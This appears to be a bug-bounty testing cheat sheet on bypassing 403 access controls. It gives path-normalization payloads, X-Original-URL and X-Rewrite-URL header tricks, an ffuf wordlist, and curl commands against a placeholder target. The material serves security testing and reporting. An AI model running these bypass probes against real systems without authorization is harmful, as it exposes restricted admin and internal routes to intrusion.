# 403 Bypass: Path Normalization + Rewrite Headers

## Core Idea

A `403 Forbidden` response does not always mean the resource is properly protected.

Sometimes the access control check happens before the server, proxy, CDN, or application framework normalizes the path. If different layers interpret the same URL differently, a blocked route may become accessible through path mutations or rewrite headers.

This is especially useful when testing:

- Admin panels
- Internal dashboards
- Hidden directories
- Restricted files
- Protected API routes
- CDN/WAF-blocked paths

---

## Basic Test Case

Start with a blocked path:

```http
GET /admin HTTP/1.1
Host: target.com
```

---

Expected response:

HTTP/1.1 403 Forbidden

Now test whether path normalization changes the response.

### Path Normalization Payloads
```
/admin
/admin/
/admin/.
/./admin
/%2fadmin
```
### What to Compare

For every payload, compare:

  - Status code
  - Response length
  - Page title
  - Redirect behavior
  - Response body
  - Response headers
  - Authentication behavior

A bypass may look like:
```
/admin      → 403
/admin/     → 200
/admin/.    → 200
/./admin    → 200
/%2fadmin   → 200
```

### Rewrite Header Bypass

Some backend servers, reverse proxies, and frameworks honor internal routing headers.

Test the blocked route normally:

GET /admin HTTP/1.1
Host: target.com

Then test with rewrite headers:

GET / HTTP/1.1
Host: target.com
X-Original-URL: /admin
GET / HTTP/1.1
Host: target.com
X-Rewrite-URL: /admin

If the frontend blocks /admin but the backend trusts these headers, the request may be internally rewritten to the protected route.

### Header Payloads
```
X-Original-URL: /admin
X-Rewrite-URL: /admin
```

You can also test them against other restricted paths:
```
X-Original-URL: /internal
X-Original-URL: /dashboard
X-Original-URL: /api/admin
X-Original-URL: /config
X-Rewrite-URL: /internal
X-Rewrite-URL: /dashboard
X-Rewrite-URL: /api/admin
X-Rewrite-URL: /config
```

### ffuf Example
```
ffuf -u https://target.com/FUZZ -w paths.txt -mc all -fs <known_403_size>
```

Example paths.txt:

admin
admin/
admin/.
./admin
%2fadmin
internal
internal/
internal/.
./internal
%2finternal
dashboard
dashboard/
dashboard/.
./dashboard
%2fdashboard

### curl Examples
```
curl -i https://target.com/admin
curl -i https://target.com/admin/
curl -i https://target.com/admin/.
curl -i https://target.com/./admin
curl -i https://target.com/%2fadmin
```

Rewrite header tests:
```
curl -i https://target.com/ -H "X-Original-URL: /admin"
curl -i https://target.com/ -H "X-Rewrite-URL: /admin"
```

### What Makes This Reportable?

This is reportable only if the bypass exposes real security impact.
